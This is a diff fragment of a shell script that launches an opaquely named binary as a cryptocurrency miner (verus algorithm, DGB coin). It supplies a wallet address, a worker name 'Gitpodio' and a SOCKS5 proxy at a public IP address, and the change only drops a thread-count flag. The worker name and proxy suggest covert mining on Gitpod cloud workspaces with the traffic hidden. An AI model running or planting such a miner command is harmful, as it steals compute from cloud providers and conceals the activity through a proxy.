@@ -8,4 +8,4 @@ B=D67zfz3CwzGqVahUP2xYazJrgZxY2gp3cD
 C=Gitpodio
 D=socks5://72.221.232.155:4145
 
-chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p c=DGB -t 4
+chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p c=DGB
